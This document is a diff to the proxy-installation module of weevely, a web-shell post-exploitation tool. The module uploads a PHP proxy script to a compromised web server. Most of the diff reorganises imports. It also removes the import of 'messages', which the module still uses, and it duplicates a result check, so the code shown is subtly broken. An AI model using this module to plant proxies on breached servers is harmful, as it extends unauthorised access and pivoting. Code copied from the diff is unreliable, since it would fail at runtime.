@@ -1,11 +1,10 @@
-from core.vectors import ModuleExec
-from core.module import Module
-from core import modules
-from core import messages
-from core.loggers import log
-import utils
 import atexit
 import os
+
+from weevely import utils
+from weevely.core.loggers import log
+from weevely.core.module import Module
+from weevely.core.vectors import ModuleExec
 
 
 class Phpproxy(Module):
@@ -37,7 +36,7 @@ class Phpproxy(Module):
         )
 
     def run(self, **kwargs):
-        with open(os.path.join(self.folder, "poxy.php"), "r") as proxyfile:
+        with open(os.path.join(self.folder, "poxy.php")) as proxyfile:
             proxycontent = proxyfile.read()
 
         result = ModuleExec("file_upload2web", ["-content", proxycontent, self.args["rname"], self.args["rpath"]]).run(
@@ -45,7 +44,9 @@ class Phpproxy(Module):
         )
 
         if not (result and len(result[0]) == 2 and result[0][0] and result[0][1]):
-            return
+            return None
+        if not (result and len(result[0]) == 2 and result[0][0] and result[0][1]):
+            return None
 
         log.warn(messages.module_net_phpproxy.phpproxy_installed_to_s_browser_to_s % (result[0][0], result[0][1]))
 
